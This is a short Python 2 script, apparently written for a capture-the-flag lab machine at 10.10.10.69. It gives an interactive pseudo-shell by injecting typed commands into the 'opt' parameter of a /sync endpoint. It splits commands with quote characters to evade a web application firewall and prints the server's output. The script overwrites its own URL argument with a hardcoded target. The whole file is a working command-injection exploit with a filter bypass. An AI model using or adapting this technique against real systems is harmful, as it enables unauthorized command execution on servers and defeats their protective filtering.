#!/usr/bin/env python2
# WAF semi shell

import sys, urllib2
import os

if len(sys.argv) != 2:
        print "Usage: shell_shocker <URL>"
        sys.exit(0)

URL=sys.argv[1]
#URL="http://10.10.10.69/sync?opt=' 'l's "

print "[+] Attempting WAF bypass shell"

while True:
        command = ''
        URL="http://10.10.10.69/sync?opt=' 'l's "
        command = raw_input("~$ ")
        command += "'"

        opener=urllib2.build_opener()
        try:
                print URL + command
                response=opener.open(URL + command)
                for line in response.readlines():
                        print line.strip()
        except Exception as e: print e
